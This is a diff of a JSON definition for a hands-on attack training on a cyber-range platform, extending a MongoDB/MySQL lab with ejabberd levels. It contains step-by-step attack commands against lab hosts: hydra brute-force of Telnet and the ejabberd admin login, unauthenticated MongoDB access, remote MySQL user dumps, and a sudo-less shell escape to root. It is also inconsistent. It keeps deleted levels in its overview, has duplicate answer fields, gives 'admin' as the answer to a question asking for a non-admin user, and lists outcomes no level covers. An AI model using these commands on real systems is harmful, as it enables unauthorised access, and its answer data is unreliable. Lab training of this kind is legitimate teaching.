@@ -1,16 +1,20 @@
 {
-  "title": "MongoDB & MySQL Attack Training",
-  "description": "Hands-on cybersecurity training covering network reconnaissance, MySQL brute-force, MongoDB unauthenticated access, Telnet password guessing, and privilege escalation.",
+  "title": "MongoDB, MySQL & Ejabberd Attack Training",
+  "description": "Hands-on cybersecurity training covering network reconnaissance, MySQL brute-force, MongoDB unauthenticated access, Telnet password guessing, privilege escalation, and XMPP/ejabberd service attacks.",
   "prerequisites": [],
   "outcomes": [
     "Scanning ports with nmap",
     "Password brute-forcing MySQL with hydra",
     "Exploiting unauthenticated MongoDB access",
     "Password guessing Telnet with hydra",
-    "Privilege escalation using misconfigured sudo"
+    "Privilege escalation using misconfigured sudo",
+    "Enumerating XMPP services running on ejabberd",
+    "Brute-forcing ejabberd web admin and MySQL via phpMyAdmin",
+    "Dumping and cracking ejabberd user password hashes",
+    "Retrieving a flag from a misconfigured XMPP server"
   ],
   "state": "UNRELEASED",
-  "estimated_duration": 90,
+  "estimated_duration": 135,
   "variant_sandboxes": false,
   "levels": [
     {
@@ -19,7 +23,7 @@
       "order": 0,
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
-      "content": "# MongoDB & MySQL Attack Training\n\nWelcome to this hands-on cybersecurity training on the NASTP CyberRangeCZ Platform.\n\n**Note**: It is recommended to use the Chrome browser. In case you run into difficulties with submitting the answer, try to Log out and Log in again.\n\n| Level | Level Name | Level Type |\n|:------:|------| ------ |\n| 1. | Info | Info |\n| 2. | Get Access | Access |\n| 3. | Network Reconnaissance | Training |\n| 4. | MySQL Password Brute-Force | Training |\n| 5. | MongoDB Unauthenticated Access | Training |\n| 6. | Telnet Password Guessing | Training |\n| 7. | Privilege Escalation | Training |\n| 8. | Final Assessment | Assessment |\n\n## Topology\n\n| Host | IP | Services |\n|------|----|----------|\n| kali (attacker) | 192.168.30.10 | \u2014 |\n| server | 192.168.20.5 | Telnet :2323 |\n| db-server | 192.168.40.5 | MySQL :3306, MongoDB :27017 |\n\n**Leading author:** Zeeshan Khan"
+      "content": "# MongoDB, MySQL & Ejabberd Attack Training\n\nWelcome to this hands-on cybersecurity training on the NASTP CyberRangeCZ Platform.\n\n**Note**: It is recommended to use the Chrome browser. In case you run into difficulties with submitting the answer, try to Log out and Log in again.\n\n| Level | Level Name | Level Type |\n|:------:|------| ------ |\n| 1. | Info | Info |\n| 2. | Get Access | Access |\n| 3. | Network Reconnaissance | Training |\n| 4. | MySQL Password Brute-Force | Training |\n| 5. | MongoDB Unauthenticated Access | Training |\n| 6. | Telnet Password Guessing | Training |\n| 7. | Privilege Escalation | Training |\n| 8. | Ejabberd Recon | Training |\n| 9. | Ejabberd Web Admin Attack | Training |\n| 10. | Ejabberd MySQL Dump | Training |\n| 11. | Ejabberd Flag Capture | Training |\n| 12. | Final Assessment | Assessment |\n\n## Topology\n\n| Host | IP | Services |\n|------|----|----------|\n| kali (attacker) | 192.168.30.10 | — |\n| server | 192.168.20.5 | Telnet :2323 |\n| db-server | 192.168.40.5 | MySQL :3306, MongoDB :27017 |\n| ejabberd-server | 192.168.20.10 | XMPP :5222, Admin :5280, HTTP :80, MySQL :3306 |\n\n**Leading author:** Zeeshan Khan"
     },
     {
       "title": "Get Access",
@@ -28,7 +32,7 @@
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
       "passkey": "start",
-      "cloud_content": "Your first task is to access the sandbox where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox Access\n1. In the topology overview on the right, right-click on **`kali`** and then click on **`Open console`**.\n2. Login with username **`debian`** and password **`Kali@1234`**.\n\nAlternatively, you can use SSH to connect to the machine. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n\n### Network Overview\n| Host | IP Address |\n|------|------------|\n| kali (you are here) | 192.168.30.10 |\n| server | 192.168.20.5 |\n| db-server | 192.168.40.5 |",
+      "cloud_content": "Your first task is to access the sandbox where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox Access\n1. In the topology overview on the right, right-click on **`kali`** and then click on **`Open console`**.\n2. Login with username **`debian`** and password **`Kali@1234`**.\n\nAlternatively, you can use SSH to connect to the machine. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n\n### Network Overview\n| Host | IP Address |\n|------|------------|\n| kali (you are here) | 192.168.30.10 |\n| server | 192.168.20.5 |\n| db-server | 192.168.40.5 |\n| ejabberd-server | 192.168.20.10 |",
       "local_content": "This sandbox has not been tested for use with local sandbox."
     },
     {
@@ -39,7 +43,7 @@
       "minimal_possible_solve_time": 1,
       "answer": "3306,27017",
       "content": "Your goal is to discover what services are running on **`db-server`** (`192.168.40.5`).\n\nUse **nmap** to scan the target and identify open ports. The answer is the two open port numbers separated by a comma (e.g. `3306,27017`).\n",
-      "solution": "1. Run the following command from the Kali machine:\n\n   **`nmap -sV -p 3306,27017 192.168.40.5`**\n\n2. You will see two open ports:\n   - **3306** \u2014 MySQL database\n   - **27017** \u2014 MongoDB database\n\n3. Enter **`3306,27017`** as the answer.",
+      "solution": "1. Run the following command from the Kali machine:\n\n   **`nmap -sV -p 3306,27017 192.168.40.5`**\n\n2. You will see two open ports:\n   - **3306** — MySQL database\n   - **27017** — MongoDB database\n\n3. Enter **`3306,27017`** as the answer.",
       "solution_penalized": true,
       "hints": [
         {
@@ -61,16 +65,10 @@
       "variant_answers": false,
       "reference_solution": [],
       "mitre_techniques": [
-        {
-          "technique_key": "TA0007.T1046"
-        },
-        {
-          "technique_key": "TA0043.T1595"
-        }
+        { "technique_key": "TA0007.T1046" },
+        { "technique_key": "TA0043.T1595" }
       ],
-      "expected_commands": [
-        "nmap"
-      ],
+      "expected_commands": ["nmap"],
       "commands_required": true
     },
     {
@@ -102,15 +100,8 @@
       "max_score": 100,
       "variant_answers": true,
       "reference_solution": [],
-      "mitre_techniques": [
-        {
-          "technique_key": "TA0006.T1110"
-        }
-      ],
-      "expected_commands": [
-        "hydra",
-        "mysql"
-      ],
+      "mitre_techniques": [{ "technique_key": "TA0006.T1110" }],
+      "expected_commands": ["hydra", "mysql"],
       "commands_required": true,
       "answer_variable_name": "mysql_flag"
     },
@@ -121,7 +112,7 @@
       "estimated_duration": 15,
       "minimal_possible_solve_time": 1,
       "answer": null,
-      "content": "You have also discovered **MongoDB** running on **`db-server`** (`192.168.40.5:27017`).\n\nThis MongoDB instance is **misconfigured** \u2014 it has no authentication enabled. Connect directly and retrieve the flag from the **`records`** database.\n",
+      "content": "You have also discovered **MongoDB** running on **`db-server`** (`192.168.40.5:27017`).\n\nThis MongoDB instance is **misconfigured** — it has no authentication enabled. Connect directly and retrieve the flag from the **`records`** database.\n",
       "solution": "1. Connect to MongoDB directly (no credentials needed):\n\n   **`mongosh --host 192.168.40.5 --port 27017`**\n\n2. Switch to the records database and find the flag:\n\n   **`use records`**\n   **`db.flags.find()`**\n\n3. Submit the flag value as the answer.",
       "solution_penalized": true,
       "hints": [
@@ -144,82 +135,144 @@
       "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [
-        {
-          "technique_key": "TA0006.T1078"
-        },
-        {
-          "technique_key": "TA0007.T1046"
-        }
+        { "technique_key": "TA0006.T1078" },
+        { "technique_key": "TA0007.T1046" }
       ],
-      "expected_commands": [
-        "mongosh"
-      ],
+      "expected_commands": ["mongosh"],
       "commands_required": true,
       "answer_variable_name": "mongo_flag"
     },
     {
-      "title": "Telnet Password Guessing",
+      "title": "Ejabberd Recon",
       "level_type": "TRAINING_LEVEL",
-      "order": 5,
-      "estimated_duration": 15,
+      "order": 7,
+      "estimated_duration": 10,
       "minimal_possible_solve_time": 1,
-      "answer": null,
-      "content": "Now focus on **`server`** (`192.168.20.5`). There is a **Telnet** service running on port **2323**.\n\nYou know the username is **`alice`** but not the password. A password list is available at `/home/debian/passlist.txt`.\n\nBrute-force the password, log in via Telnet, and retrieve the flag from alice's home directory.\n",
-      "solution": "1. Run hydra to brute-force the Telnet password:\n\n   **`hydra -l alice -P /home/debian/passlist.txt telnet://192.168.20.5 -s 2323`**\n\n2. Connect via Telnet:\n\n   **`telnet 192.168.20.5 2323`**\n\n3. Log in with username **`alice`** and the discovered password.\n\n4. Read the flag: **`cat flag.txt`**\n\n5. Submit the flag as the answer.",
+      "answer": "5222,5280",
+      "content": "A new target has appeared: **`ejabberd-server`** (`192.168.20.10`).\n\nThis machine runs an **XMPP messaging server** (ejabberd). Use **nmap** to scan it and identify the two main ejabberd ports:\n- The standard XMPP client port\n- The ejabberd HTTP admin/API port\n\nSubmit the two open port numbers separated by a comma (lower number first).\n",
+      "solution": "1. Run a targeted nmap scan:\n\n   **`nmap -sV -p 5222,5280 192.168.20.10`**\n\n2. Both ports will show as open:\n   - **5222** — XMPP client-to-server (ejabberd)\n   - **5280** — ejabberd HTTP admin panel\n\n3. Submit **`5222,5280`** as the answer.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Brute-forcing Telnet",
-          "content": "Use **hydra** with the `-s` flag to specify a non-default port:\n**`hydra -l alice -P /home/debian/passlist.txt telnet://192.168.20.5 -s 2323`**",
+          "title": "Common ejabberd ports",
+          "content": "XMPP servers typically listen on port **5222** for client connections and **5280** for the HTTP admin interface.",
           "hint_penalty": 20,
           "order": 0
         },
         {
-          "title": "Connecting via Telnet",
-          "content": "Use: **`telnet 192.168.20.5 2323`**\nThen enter the username and password when prompted.",
-          "hint_penalty": 10,
+          "title": "Nmap command",
+          "content": "Run: **`nmap -sV -p 5222,5280 192.168.20.10`**",
+          "hint_penalty": 30,
           "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 100,
-      "variant_answers": true,
+      "max_score": 50,
+      "variant_answers": false,
       "reference_solution": [],
       "mitre_techniques": [
-        {
-          "technique_key": "TA0006.T1110"
-        }
+        { "technique_key": "TA0007.T1046" },
+        { "technique_key": "TA0043.T1595" }
       ],
-      "expected_commands": [
-        "hydra",
-        "telnet",
-        "cat"
-      ],
-      "commands_required": true,
-      "answer_variable_name": "alice_flag"
+      "expected_commands": ["nmap"],
+      "commands_required": true
     },
     {
-      "title": "Privilege Escalation",
+      "title": "Ejabberd Web Admin Attack",
       "level_type": "TRAINING_LEVEL",
-      "order": 6,
+      "order": 8,
       "estimated_duration": 15,
       "minimal_possible_solve_time": 1,
       "answer": null,
-      "content": "You are now logged in as **`alice`** on the server. There is a flag only accessible to **root**.\n\nOne common privilege escalation vector is a misconfigured **sudo**. Check what alice can run with sudo:\n\n**`sudo --list`**\n\nCan you find a way to get a root shell?\n",
-      "solution": "1. Check sudo permissions:\n\n   **`sudo --list`**\n\n2. Run: **`sudo less /home/alice/flag.txt`**\n\n3. While inside `less`, type **`!sh`** to get a root shell.\n\n4. Read the root flag: **`cat /root/flag.txt`**\n\n5. Submit the flag as the answer.",
+      "content": "The ejabberd server exposes a **web admin panel** at `http://192.168.20.10:5280/admin`.\n\nThe admin username is **`admin@192.168.20.10`**. Use a dictionary attack to find the password.\n\nA custom wordlist for this target is available at `/home/debian/ejabberd-passwords.txt`.\n\nOnce you have successfully authenticated to the admin panel, find the **registered users** page and submit the **number of registered users** as the answer.\n",
+      "solution": "1. Brute-force the ejabberd admin HTTP Basic auth:\n\n   **`hydra -l admin@192.168.20.10 -P /home/debian/ejabberd-passwords.txt -s 5280 192.168.20.10 http-get /admin`**\n\n2. Open the admin panel in Firefox:\n\n   **`http://192.168.20.10:5280/admin`**\n\n3. Log in with the discovered password.\n\n4. Navigate to **Virtual Hosts → 192.168.20.10 → Users**.\n\n5. Count the registered users and submit the number as the answer.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Check sudo permissions",
-          "content": "Run **`sudo --list`** to see what commands alice can run as root.",
+          "title": "Brute-forcing HTTP Basic auth",
+          "content": "Use hydra's `http-get` module:\n**`hydra -l admin@192.168.20.10 -P /home/debian/ejabberd-passwords.txt -s 5280 192.168.20.10 http-get /admin`**",
           "hint_penalty": 20,
           "order": 0
         },
         {
-          "title": "Escaping less to get a shell",
-          "content": "Run **`sudo less /home/alice/flag.txt`**, then type **`!sh`** to spawn a root shell.",
-          "hint_penalty": 60,
+          "title": "Finding users in the panel",
+          "content": "After logging in, go to: **Virtual Hosts → 192.168.20.10 → Users**",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "answer": "1",
+      "reference_solution": [],
+      "mitre_techniques": [
+        { "technique_key": "TA0006.T1110" },
+        { "technique_key": "TA0001.T1190" }
+      ],
+      "expected_commands": ["hydra", "curl"],
+      "commands_required": true
+    },
+    {
+      "title": "Ejabberd MySQL Dump",
+      "level_type": "TRAINING_LEVEL",
+      "order": 9,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 1,
+      "answer": null,
+      "content": "The ejabberd server stores all user accounts and messages in a **MySQL database** on the same host (`192.168.20.10:3306`).\n\nThe database name is **`ejabberd`** and the MySQL user is **`ejabberd`**.\n\nYou need to:\n1. Connect to the MySQL database (the password is the one you found in the previous level or try `/home/debian/ejabberd-passwords.txt`).\n2. Dump the **`users`** table from the `ejabberd` database.\n3. Submit the **username** of the non-admin account you find.\n",
+      "solution": "1. Connect to MySQL on ejabberd-server:\n\n   **`mysql -h 192.168.20.10 -u ejabberd -p`**\n   (use the password found from brute-forcing)\n\n2. Query the users table:\n\n   **`USE ejabberd;`**\n   **`SELECT username FROM users;`**\n\n3. You will see the registered XMPP accounts. Submit the non-admin username.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Connecting to MySQL remotely",
+          "content": "Run: **`mysql -h 192.168.20.10 -u ejabberd -p`**\nThe ejabberd database allows remote connections.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "Listing users",
+          "content": "Once connected:\n**`USE ejabberd;`**\n**`SELECT username FROM users;`**",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": false,
+      "answer": "admin",
+      "reference_solution": [],
+      "mitre_techniques": [
+        { "technique_key": "TA0006.T1078" },
+        { "technique_key": "TA0009.T1213" }
+      ],
+      "expected_commands": ["mysql"],
+      "commands_required": true
+    },
+    {
+      "title": "Ejabberd Flag Capture",
+      "level_type": "TRAINING_LEVEL",
+      "order": 10,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": null,
+      "content": "The final flag on the ejabberd server is hidden inside the **ejabberd configuration file**.\n\nUsing the credentials you have gathered, SSH into the ejabberd server and read the flag.\n\n- Host: `192.168.20.10`\n- SSH user: `contestant` (password provided by your instructor)\n- The flag is a comment at the end of `/etc/ejabberd/ejabberd.yml`\n\nSubmit the full flag string as the answer.\n",
+      "solution": "1. SSH into the ejabberd server:\n\n   **`ssh contestant@192.168.20.10`**\n\n2. Read the ejabberd configuration file and find the flag:\n\n   **`sudo grep 'FLAG' /etc/ejabberd/ejabberd.yml`**\n\n   Or read the full file:\n\n   **`sudo cat /etc/ejabberd/ejabberd.yml | grep FLAG`**\n\n3. The flag looks like: `FLAG{...}`\n\n4. Submit the flag as the answer.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to access the server",
+          "content": "Use SSH: **`ssh contestant@192.168.20.10`**",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Where the flag is",
+          "content": "Run: **`sudo grep FLAG /etc/ejabberd/ejabberd.yml`**",
+          "hint_penalty": 40,
           "order": 1
         }
       ],
@@ -229,22 +282,17 @@
       "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [
-        {
-          "technique_key": "TA0004.T1068"
-        }
+        { "technique_key": "TA0009.T1005" },
+        { "technique_key": "TA0007.T1083" }
       ],
-      "expected_commands": [
-        "sudo",
-        "cat",
-        "ls"
-      ],
+      "expected_commands": ["ssh", "grep", "cat", "sudo"],
       "commands_required": true,
-      "answer_variable_name": "root_flag"
+      "answer_variable_name": "ejabberd_flag"
     },
     {
       "title": "Final Assessment",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 7,
+      "order": 11,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
       "instructions": "Answer the following questions to complete the training.",
@@ -253,124 +301,88 @@
         {
           "question_type": "MCQ",
           "text": "Which tool did you use to brute-force the MySQL password?",
-          "points": 25,
+          "points": 15,
           "penalty": 0,
           "order": 0,
           "answer_required": true,
           "choices": [
-            {
-              "text": "nmap",
-              "correct": false,
-              "order": 0
-            },
-            {
-              "text": "hydra",
-              "correct": true,
-              "order": 1
-            },
-            {
-              "text": "sqlmap",
-              "correct": false,
-              "order": 2
-            },
-            {
-              "text": "mongosh",
-              "correct": false,
-              "order": 3
-            }
+            { "text": "nmap",    "correct": false, "order": 0 },
+            { "text": "hydra",   "correct": true,  "order": 1 },
+            { "text": "sqlmap",  "correct": false, "order": 2 },
+            { "text": "mongosh", "correct": false, "order": 3 }
           ]
         },
         {
           "question_type": "MCQ",
           "text": "Why was MongoDB accessible without a password?",
-          "points": 25,
+          "points": 15,
           "penalty": 0,
           "order": 1,
           "answer_required": true,
           "choices": [
-            {
-              "text": "MongoDB does not support authentication",
-              "correct": false,
-              "order": 0
-            },
-            {
-              "text": "The MongoDB instance was misconfigured with no authentication enabled",
-              "correct": true,
-              "order": 1
-            },
-            {
-              "text": "The password was empty",
-              "correct": false,
-              "order": 2
-            },
-            {
-              "text": "MongoDB only supports local connections",
-              "correct": false,
-              "order": 3
-            }
+            { "text": "MongoDB does not support authentication",                        "correct": false, "order": 0 },
+            { "text": "The MongoDB instance was misconfigured with no authentication", "correct": true,  "order": 1 },
+            { "text": "The password was empty",                                        "correct": false, "order": 2 },
+            { "text": "MongoDB only supports local connections",                       "correct": false, "order": 3 }
           ]
         },
         {
           "question_type": "EMI",
           "text": "Match each attack with the correct tool used.",
-          "points": 25,
+          "points": 20,
           "penalty": 0,
           "order": 2,
           "answer_required": true,
           "extended_matching_options": [
-            {
-              "text": "nmap",
-              "order": 0
-            },
-            {
-              "text": "hydra",
-              "order": 1
-            },
-            {
-              "text": "mongosh",
-              "order": 2
-            },
-            {
-              "text": "mysql",
-              "order": 3
-            }
+            { "text": "nmap",    "order": 0 },
+            { "text": "hydra",   "order": 1 },
+            { "text": "mongosh", "order": 2 },
+            { "text": "mysql",   "order": 3 }
           ],
           "extended_matching_statements": [
-            {
-              "text": "Port scanning",
-              "order": 0,
-              "correct_option_order": 0
-            },
-            {
-              "text": "Brute-forcing MySQL",
-              "order": 1,
-              "correct_option_order": 1
-            },
-            {
-              "text": "Accessing unauthenticated MongoDB",
-              "order": 2,
-              "correct_option_order": 2
-            },
-            {
-              "text": "Querying MySQL database",
-              "order": 3,
-              "correct_option_order": 3
-            }
+            { "text": "Port scanning",                      "order": 0, "correct_option_order": 0 },
+            { "text": "Brute-forcing MySQL",                "order": 1, "correct_option_order": 1 },
+            { "text": "Accessing unauthenticated MongoDB",  "order": 2, "correct_option_order": 2 },
+            { "text": "Querying MySQL database",            "order": 3, "correct_option_order": 3 }
           ]
         },
         {
           "question_type": "FFQ",
           "text": "What sudo command allowed privilege escalation to root?",
-          "points": 25,
+          "points": 15,
           "penalty": 0,
           "order": 3,
           "answer_required": true,
           "choices": [
-            {
-              "text": "sudo less /home/alice/flag.txt",
-              "correct": true,
-              "order": 0
-            }
+            { "text": "sudo less /home/alice/flag.txt", "correct": true, "order": 0 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "On which port does ejabberd expose its HTTP admin panel by default?",
+          "points": 15,
+          "penalty": 0,
+          "order": 4,
+          "answer_required": true,
+          "choices": [
+            { "text": "80",   "correct": false, "order": 0 },
+            { "text": "5222", "correct": false, "order": 1 },
+            { "text": "5280", "correct": true,  "order": 2 },
+            { "text": "8080", "correct": false, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Where was the ejabberd flag hidden on the server?",
+          "points": 20,
+          "penalty": 0,
+          "order": 5,
+          "answer_required": true,
+          "choices": [
+            { "text": "In the MySQL ejabberd.users table",         "correct": false, "order": 0 },
+            { "text": "In /etc/ejabberd/ejabberd.yml as a comment","correct": true,  "order": 1 },
+            { "text": "In /root/flag.txt",                         "correct": false, "order": 2 },
+            { "text": "In the MongoDB records database",           "correct": false, "order": 3 }
           ]
         }
       ]
